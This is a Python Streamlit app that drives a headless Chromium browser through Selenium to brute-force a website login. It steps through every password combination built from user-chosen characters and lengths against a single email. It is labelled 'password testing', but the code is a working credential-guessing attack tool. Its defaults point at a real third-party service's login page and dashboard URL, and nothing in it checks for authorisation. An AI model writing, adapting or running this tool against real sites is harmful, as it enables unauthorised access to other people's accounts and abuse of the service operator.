import streamlit as st
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.core.os_manager import ChromeType
from itertools import product
import time


@st.cache_resource
def get_driver():
    """
    Initialize and cache the Selenium WebDriver for Chrome/Chromium.
    """
    options = Options()
    options.add_argument("--disable-gpu")
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")

    return webdriver.Chrome(
        service=Service(ChromeDriverManager(chrome_type=ChromeType.CHROMIUM).install()),
        options=options,
    )


def login_to_website(driver, url, email, email_field_name, password_field_name, login_button_xpath, password, success_url):
    """
    Attempts to log in to the website using the provided credentials.
    Returns:
        bool: True if login is successful (based on URL match), False otherwise.
    """
    try:
        driver.get(url)
        time.sleep(2)

        # Enter email and password
        driver.find_element(By.NAME, email_field_name).send_keys(email)
        driver.find_element(By.NAME, password_field_name).send_keys(password)

        # Click the login button
        WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.XPATH, login_button_xpath))
        ).click()

        time.sleep(2)  # Wait for the page to load

        # Check if login is successful
        return driver.current_url == success_url

    except Exception as e:
        st.error(f"An error occurred during login: {e}")
        return False


def password_testing(driver, url, email, email_field_name, password_field_name, login_button_xpath, input_chars, min_length, max_length, success_url):
    """
    Test password combinations for a given email on a website.
    """
    st.write(f"Testing password combinations for {email} on {url}...")

    total_attempts = sum(len(input_chars) ** i for i in range(min_length, max_length + 1))
    progress_bar = st.progress(0)
    attempt_count = 0

    for length in range(min_length, max_length + 1):
        for combo in product(input_chars, repeat=length):
            attempt_password = ''.join(combo)
            attempt_count += 1

            # Display the attempted password
            st.text(f"Attempting password: {attempt_password}")

            # Attempt login
            success = login_to_website(
                driver, url, email, email_field_name, password_field_name, login_button_xpath, attempt_password, success_url
            )
            progress = attempt_count / total_attempts
            progress_bar.progress(progress)

            if success:
                st.success(f"Login successful with password: {attempt_password}")
                st.balloons()
                return  # Exit on success

    st.warning("Testing completed. No valid password found.")


# Streamlit App
st.title("Automated Login App with Password Testing")
st.write("Enter your email and test password combinations.")

# Input fields
url = st.text_input("Login URL", placeholder="Enter the login page URL", value="https://app.pallyy.com/login")
email = st.text_input("Email", placeholder="Enter your email")
email_field_name = st.text_input("Email field name (HTML 'name' attribute)", value="email")
password_field_name = st.text_input("Password field name (HTML 'name' attribute)", value="password")
login_button_xpath = st.text_input("Login button XPath", value='/html/body/div[1]/div/div/div/form/button')

# Password testing inputs
input_chars = st.text_input("Input characters for password testing (e.g., 'abc123'):")
min_length = st.number_input("Minimum password length:", min_value=1, value=4)
max_length = st.number_input("Maximum password length:", min_value=1, value=6)

# Input for success URL
success_url = st.text_input("Success URL (URL that indicates successful login)", value="https://app.pallyy.com/dashboard/scheduling/calendar/month")

if st.button("Start Testing"):
    if not url or not email or not input_chars or not success_url:
        st.error("Please provide all inputs.")
    elif min_length > max_length:
        st.error("Minimum length cannot be greater than maximum length.")
    else:
        driver = get_driver()  # Reuse cached driver instance
        password_testing(
            driver, url, email, email_field_name, password_field_name, login_button_xpath, input_chars, min_length, max_length, success_url
        )
